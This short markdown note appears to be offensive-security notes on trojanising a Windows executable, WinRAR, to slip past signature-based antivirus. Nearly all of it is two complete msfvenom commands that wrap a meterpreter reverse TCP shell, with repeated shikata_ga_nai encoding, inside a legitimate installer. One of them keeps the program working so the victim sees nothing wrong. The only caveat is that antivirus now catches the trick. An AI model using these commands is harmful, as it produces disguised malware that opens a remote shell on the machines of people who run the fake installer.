# Injecting Payloads into Windows portable executables

This can be used to avoid signature based AVs  
-x -- this will allow us to use a template
-k -- This will preserve the template behaviour and inject payload as new thread

_Some executables will not allow injections_  

Winrar will allow you to inject  
1. Download winrar
2. ```msfvenom -p windows/meterpreter/reverse_tcp LHOST=(Host IP) LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x (executable you are injecting) > winrar.exe```

Maintain functionality of exe  
1. Download winrar
2. ```msfvenom -p windows/meterpreter/reverse_tcp LHOST=(Host IP) LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -k -x (executable you are injecting) > winrar.exe```  
This technique doesnt work muc hany longer due to antivirus catching on
